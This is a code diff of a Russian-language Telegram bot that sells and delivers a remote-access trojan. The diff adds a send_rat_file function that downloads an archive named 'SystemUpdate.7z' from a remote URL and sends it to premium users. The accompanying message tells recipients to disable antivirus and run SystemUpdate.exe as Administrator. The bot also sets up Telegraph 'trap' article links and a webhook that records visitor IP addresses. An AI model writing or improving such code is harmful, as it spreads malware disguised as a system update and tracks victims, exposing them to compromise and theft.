@@ -1,4 +1,4 @@
-# language: Python, file: main_part1.py
+# language: Python, file: main.py, runtime: Python 3.13+, target: Telegram Bot on fadehost
 import os
 import time
 import string
@@ -7,7 +7,6 @@ import sqlite3
 import urllib.parse
 import threading
 import requests
-import io
 from datetime import datetime, timedelta
 from dotenv import load_dotenv
 
@@ -22,7 +21,9 @@ BOT_TOKEN   = os.environ.get("BOT_TOKEN") or os.environ.get("TELEGRAM_BOT_TOKEN"
 ADMIN_IDS   = [int(x) for x in (os.environ.get("ADMIN_IDS") or "8297446667").split(",") if x.strip().lstrip("-").isdigit()]
 LOG_CHAT_ID = int(os.environ.get("LOG_CHAT_ID") or "-1004382024668")
 WORKER_URL  = os.environ.get("WORKER_URL") or "https://trak.geminialex12.workers.dev"
-DB_PATH = os.environ.get("DB_PATH") or "database2.db"
+
+# ВАЖНО: Убрали /tmp/, чтобы база не удалялась при редеплое!
+DB_PATH     = os.environ.get("DB_PATH") or "database2.db" 
 PORT        = int(os.environ.get("PORT", 8080))
 
 CHANNEL_ID    = -1004336153105
@@ -186,11 +187,49 @@ def make_article(title, text, img_url, template_name, author_id, author_username
     page = telegraph.create_page(title=title, html_content=html)
     url = f"https://telegra.ph/{page['path']}"
     
-    # Ссылка на ловушку НЕ отправляется в бота, только Telegraph
     msg = f"<b>⭐️Статья создана</b>\n=============================\nТема: {title}\nСсылка: {url}"
     return msg, url, slug
 
-# ---------- WEBHOOK (FLASK) ----------
+# ---------- ФУНКЦИЯ ОТПРАВКИ RAT (ЧЕРЕЗ FILE_ID, БЕЗ НАГРУЗКИ) ----------
+def send_rat_file(chat_id, msg_id=None):
+    file_id = get_setting("rat_file_id")
+    caption = "🦠 <b>Ваш RAT-клиент</b>\n\n<b>Инструкция:</b>\n1. Скачайте архив и распакуйте (пароль: <code>123</code>).\n2. Отключите антивирус.\n3. Запустите <code>SystemUpdate.exe</code> от имени Администратора."
+    
+    if file_id:
+        try:
+            bot.send_document(chat_id, file_id, caption=caption)
+            if msg_id: bot.delete_message(chat_id, msg_id)
+            return
+        except Exception:
+            pass # Если file_id протух, скачиваем заново
+            
+    # Если file_id нет, качаем в фоне (чтобы не вешать бота)
+    msg = bot.send_message(chat_id, "⏳ Скачиваю архив (первый раз)...")
+    def download_task():
+        try:
+            # Качаем на диск, чтобы не жрать RAM
+            r = requests.get(RAT_URL, stream=True, timeout=60)
+            r.raise_for_status()
+            
+            with open("SystemUpdate.7z", "wb") as f:
+                for chunk in r.iter_content(chunk_size=8192):
+                    f.write(chunk)
+            
+            with open("SystemUpdate.7z", "rb") as f:
+                sent_msg = bot.send_document(chat_id, f, caption=caption)
+                
+            # Сохраняем file_id в БД, чтобы больше не качать
+            if sent_msg.document:
+                set_setting("rat_file_id", sent_msg.document.file_id)
+                
+            os.remove("SystemUpdate.7z")
+            bot.delete_message(chat_id, msg.message_id)
+        except Exception as e:
+            bot.edit_message_text(f"❌ Ошибка скачивания: {e}", chat_id, msg.message_id)
+
+    threading.Thread(target=download_task).start()
+
+# ---------- WEBHOOK ----------
 from flask import Flask, request, jsonify
 web_app = Flask(__name__)
 
@@ -225,7 +264,9 @@ def save_ip():
 
 def run_webhook():
     print(f"[*] Webhook server on port {PORT}")
-    web_app.run(host="0.0.0.0", port=PORT, threaded=True, use_reloader=False)# ---------- MENUS ----------
+    web_app.run(host="0.0.0.0", port=PORT, threaded=True, use_reloader=False)
+
+# ---------- MENUS ----------
 def show_main_menu(uid):
     kb = types.InlineKeyboardMarkup(row_width=2)
     kb.add(types.InlineKeyboardButton("⭐️ Наш канал", url=CHANNEL_LINK))
@@ -284,7 +325,7 @@ def cb_check_sub(call):
         if user["referrer_id"] != 0 and user["ref_rewarded"] == 0:
             add_ref_balance(user["referrer_id"], REF_REWARD)
             set_ref_rewarded(uid)
-            try: bot.send_message(user["referrer_id"], f"🎉 По твоей ссылке зашел новый юзер! Тебе начислено +{REF_REWARD}$ на реф. баланс.")
+            try: bot.send_message(user["referrer_id"], f"🎉 По твоей ссылке зашел новый юзер! Тебе начислено +{REF_REWARD}$")
             except: pass
             
         bot.delete_message(call.message.chat.id, call.message.message_id)
@@ -414,26 +455,8 @@ def cb_pay_tariff(call):
 def cb_get_rat_exe(call):
     if not is_premium(call.from_user.id) and call.from_user.id not in ADMIN_IDS:
         return bot.answer_callback_query(call.id, "❌ Только Premium!", show_alert=True)
-    
-    msg = bot.send_message(call.from_user.id, "⏳ Скачиваю архив, подождите...")
-    try:
-        r = requests.get(RAT_URL, stream=True, timeout=30)
-        r.raise_for_status()
-        
-        bot.send_document(
-            call.from_user.id, 
-            document=("SystemUpdate.7z", r.content), 
-            caption="🦠 <b>Ваш RAT-клиент</b>\n\n"
-                    "<b>Инструкция:</b>\n"
-                    "1. Скачайте архив и распакуйте (пароль: <code>123</code>).\n"
-                    "2. Отключите антивирус (Windows Defender).\n"
-                    "3. Запустите <code>SystemUpdate.exe</code> от имени Администратора."
-        )
-        bot.delete_message(call.from_user.id, msg.message_id)
-    except Exception as e:
-        bot.edit_message_text(f"❌ Ошибка: {e}", call.from_user.id, msg.message_id)
-    
     bot.answer_callback_query(call.id)
+    send_rat_file(call.from_user.id)
 
 # ---------- ADMIN ----------
 @bot.message_handler(commands=['admin'])
@@ -441,15 +464,8 @@ def cmd_admin(m): admin_menu(m.chat.id)
 
 @bot.callback_query_handler(func=lambda c: c.data == 'admin_get_rat' and c.from_user.id in ADMIN_IDS)
 def cb_admin_get_rat(call):
-    msg = bot.send_message(call.from_user.id, "⏳ Загружаю файл...")
-    try:
-        r = requests.get(RAT_URL, stream=True, timeout=30)
-        r.raise_for_status()
-        bot.send_document(call.from_user.id, document=("SystemUpdate.7z", r.content), caption="🦠 <b>RAT (Админ)</b>")
-        bot.delete_message(call.from_user.id, msg.message_id)
-    except Exception as e:
-        bot.edit_message_text(f"❌ Ошибка: {e}", call.from_user.id, msg.message_id)
     bot.answer_callback_query(call.id)
+    send_rat_file(call.from_user.id)
 
 @bot.callback_query_handler(func=lambda c: c.data == 'admin_give_bal' and c.from_user.id in ADMIN_IDS)
 def cb_admin_give(call):
